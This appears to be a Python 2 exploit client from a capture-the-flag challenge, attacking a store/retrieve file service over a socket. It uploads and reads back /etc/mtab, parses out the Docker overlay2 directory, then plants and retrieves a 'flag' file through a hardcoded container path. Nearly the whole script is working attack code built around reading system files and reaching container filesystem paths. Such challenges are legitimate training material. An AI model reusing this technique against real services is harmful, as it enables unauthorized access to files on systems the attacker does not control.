import socket
import subprocess
import re
import sys
import os
import struct

def read_exact(sock, elen):
    data = ''
    while len(data) < elen:
        data += sock.recv(elen-len(data))
    return data


def stor(sock, f):
    fname = f
    try:
        data = open(fname, "rb").read()
    except:
        print "Can't read file!"
        return False
    try:
        pass
    except:
        pass
    if True:
        upload_name = os.path.basename(fname)
        sock.send('S')
        sock.send(struct.pack("<L", len(upload_name)))
        sock.send(upload_name)
        sock.send(struct.pack("<L", len(data)))
        sock.send(data)
    try:
        pass
    except:
        print "conn closed?"
        return False
    try:
        res = read_exact(sock, 3)
    except:
        res = 'BAD'
    if res != "OK!":
        print "Can't store file!"
        return False
    return True

def retr(sock, f):
    fname = f
    try:
        sock.send('R')
        sock.send(struct.pack("<L", len(fname)))
        sock.send(fname)
    except:
        print "conn closed?"
        return False
    data = sock.recv(4)
    print "Printing some data"
    print data
    if len(data) != 4:
        return False
    exp_len = struct.unpack("<L", data)[0]
    if exp_len > 4096:
        print "Network error! We can't work with files more than 4096 bytes!"
        return
    try:
        data = read_exact(sock, exp_len)
    except:
        print "Can't read content"
        return False
    print data

    docker = re.search('workdir=.*?/lib/docker/overlay2/.*?/work', data).group(0)[9:]
    print "obtained root image"
    print docker

    docker = "/var/lib/docker/overlay2/l/VO2HMNBLWZSS2SSO4QALN6X6I6"

    print "creating file locally"
    subprocess.check_output(['mkdir', '-p', docker + "/home/"])
    subprocess.check_output(['touch', docker + "/home/flag"])
    print "storing flag file"
    stor(sock, docker + "/home/flag")

    print docker + "/home/flag"

    print "retreiving flag"
    retr(sock, docker + "/home/flag")

    return True

HANDLERS = {
    'store': stor,
    'retreive': retr
}

def process(sock):
    comm = raw_input("Choose what you want to do(store, retreive):")
    handler = HANDLERS.get(comm, None)
    if handler is None:
        print "Sorry, no such command!"
        return False
    return handler(sock)

def main():
    if len(sys.argv) < 3:
        print "Usage: {} host port".format(sys.argv[1])
        return
    port_number = None
    try:
        port_number = int(sys.argv[2])
    except:
        print "Can't get port number"
        return
    s = socket.socket()
    s.connect((sys.argv[1], port_number))
    still_run = True

    print "sending /etc/mtab"
    stor(s, "/etc/mtab")
    print "retreiving /etc/mtab"
    retr(s, "/etc/mtab")


    # while still_run:
    #     still_run = process(s)


if __name__ == "__main__":
    main()
